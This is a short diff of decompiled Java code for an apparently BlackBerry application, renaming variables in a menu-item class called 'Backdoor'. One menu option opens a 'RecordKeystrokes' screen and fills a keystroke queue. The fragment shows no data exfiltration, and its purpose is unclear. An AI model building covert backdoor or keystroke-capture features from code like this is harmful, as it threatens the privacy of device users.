@@ -8,10 +8,10 @@ class Backdoor$MyMenuItem extends MenuItem {
    int _id;
    private final Backdoor this$0;
 
-   Backdoor$MyMenuItem(Backdoor var1, String var2, int var3) {
-      super(var2, 0, 0);
-      this.this$0 = var1;
-      this._id = var3;
+   Backdoor$MyMenuItem(Backdoor _1, String label, int id) {
+      super(label, 0, 0);
+      this.this$0 = _1;
+      this._id = id;
    }
 
    @Override
@@ -22,9 +22,9 @@ class Backdoor$MyMenuItem extends MenuItem {
             this.this$0.validate(UiApplication.getUiApplication().getActiveScreen());
             return;
          case 2:
-            RecordKeystrokes var1 = new RecordKeystrokes();
-            UiApplication.getUiApplication().pushModalScreen(var1);
-            var1.fillqueue(100);
+            RecordKeystrokes keys = new RecordKeystrokes();
+            UiApplication.getUiApplication().pushModalScreen(keys);
+            keys.fillqueue(100);
             Application.getApplication().invokeLater(new MessageTiming());
             return;
          case 3:
